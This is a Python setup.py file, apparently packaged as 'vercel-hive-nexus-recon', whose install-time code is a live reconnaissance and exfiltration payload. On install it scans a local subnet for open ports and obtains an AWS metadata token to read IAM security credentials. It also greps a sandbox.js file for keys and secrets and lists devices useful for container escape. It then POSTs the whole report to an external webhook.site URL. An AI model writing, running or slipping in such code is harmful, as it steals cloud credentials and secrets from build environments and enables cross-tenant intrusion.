import os
import subprocess
import socket
from setuptools import setup

def run(cmd):
    try: return subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5).stdout.strip()
    except: return "Timeout/Error"

# --- КОНФИГ ---
WEBHOOK_URL = "https://webhook.site/654ef753-d639-43ad-970c-9b90a3fa1fb9"

# 1. СКАНИРОВАНИЕ СОСЕДЕЙ (БЫСТРЫЙ ПИНГ ПОДСЕТИ)
# Мы проверим только первые 10 адресов в нашей подсети 192.168.43.x
network_neighbors = ""
my_ip_prefix = "192.168.43."
for i in range(1, 11):
    ip = f"{my_ip_prefix}{i}"
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(0.05)
        if s.connect_ex((ip, 80)) == 0: # Проверяем HTTP порт
            network_neighbors += f"ALIVE: {ip} | "

# 2. ПОПЫТКА ВЗЛОМА МЕТАДАННЫХ (IMDSv2)
aws_token = run("curl -s -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-metadata-token-ttl-seconds: 60'")
aws_creds = "BLOCKED"
if aws_token and "Error" not in aws_token:
    aws_creds = run(f"curl -s -H 'X-aws-metadata-token: {aws_token}' http://169.254.169.254/latest/meta-data/iam/security-credentials/")

# 3. АНАЛИЗ БИНАРНИКА SANDBOX.JS
sandbox_path = run("readlink -f /proc/15/exe || which node")
sandbox_strings = run(f"strings /var/task/sandbox.js | grep -E 'http|key|secret|auth' | head -n 15")

# 4. СБОРКА УЛЬТИМАТИВНОГО ОТЧЕТА
report = f"""
#######################################################
#     VERCEL HIVE: CROSS-TENANT & CLOUD EXPOSURE      #
#######################################################

[!] NETWORK NEIGHBORS (PROXIMITY CHECK)
MY_IP: {run('hostname -I')}
NEIGHBORS: {network_neighbors if network_neighbors else "None on port 80"}

[!] AWS CLOUD PERMISSIONS (CRITICAL)
TOKEN_OBTAINED: {"YES" if aws_token else "NO"}
IAM_ROLE: {aws_creds}

[!] SANDBOX SOURCE ANALYSIS
PATH: {sandbox_path}
STRINGS_LEAK:
{sandbox_strings}

[!] CONTAINER ESCAPE PRIMITIVES
DEVICES: {run('ls -l /dev | grep -E "sd|nvme|mem"')}
SYSCTL: {run('sysctl kernel.panic 2>/dev/null || echo "Restricted"')}

#######################################################
"""

# --- ОТПРАВКА ---
try:
    subprocess.run(['curl', '-s', '-X', 'POST', '-H', 'Content-Type: text/plain', '--data-binary', report, WEBHOOK_URL])
except:
    pass

setup(name="vercel-hive-nexus-recon", version="5.5.5")
